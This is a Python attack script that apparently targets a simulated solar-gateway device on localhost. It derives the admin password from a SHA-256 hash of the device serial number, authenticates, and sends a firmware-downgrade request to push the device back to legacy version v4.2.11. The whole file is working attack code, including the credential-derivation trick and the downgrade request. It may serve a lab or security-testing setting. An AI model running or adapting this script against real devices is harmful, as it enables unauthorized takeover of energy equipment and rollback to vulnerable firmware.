import requests
import hashlib
from utils.logger import log_message

TARGET = "http://localhost:5000"

def run_lotl_attack():
    try:
        # Step 1: Get serial and derive password
        info = requests.get(f"{TARGET}/info").json()
        serial = info["serial_number"]
        password = hashlib.sha256(serial.encode()).hexdigest()[:8]

        log_message(f"Serial: {serial}", level="INFO")
        log_message(f"Derived password: {password}", level="INFO")

        # Step 2: Authenticate
        login = requests.post(f"{TARGET}/api/login", json={
            "username": "admin",
            "password": password
        })

        if login.status_code != 200:
            log_message("Login failed", level="ERROR")
            return

        token = login.json()["token"]
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }

        log_message("Authenticated successfully", level="INFO")

        # Step 3: Perform downgrade attack (LoTL-style)
        log_message("Attempting to downgrade to legacy firmware v4.2.11...", level="INFO")

        payload = {
            "firmware_url": "https://firmware-cache.local/enphase/v4.2.11.img"
        }

        response = requests.post(f"{TARGET}/installer/upgrade_start",
                                 headers=headers,
                                 json=payload)

        if response.status_code == 200:
            resp_json = response.json()
            log_message(f"LoTL attack successful: {resp_json['message']}", level="INFO")
            log_message(f"Device downgraded to: {resp_json['version']}", level="INFO")
        else:
            log_message(f"LoTL attack failed: {response.text}", level="ERROR")

    except Exception as e:
        log_message(f"Unexpected error: {e}", level="ERROR")
